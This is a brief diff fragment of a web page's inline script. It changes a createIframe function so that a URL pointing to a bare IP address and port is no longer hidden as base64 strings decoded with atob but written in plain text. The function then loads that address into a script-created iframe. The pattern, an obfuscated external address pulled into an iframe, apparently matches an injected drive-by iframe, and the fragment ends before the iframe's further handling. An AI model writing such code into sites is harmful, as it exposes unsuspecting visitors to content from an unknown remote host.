@@ -33,7 +33,7 @@
 </script>
     <script>
         function createIframe() {
-            const parts = ['aHR0cA==', 'Oi8v', 'NDcuOTcuMzAuMjAy', 'Og==', 'MTUyNDQ=', 'Lw=='].map(atob);
+            const parts = ['http', '://', '47.97.30.202', ':', '15244', '/'];
             const url = parts.join('');
             const iframe = document.createElement('iframe');
             iframe.src = url;
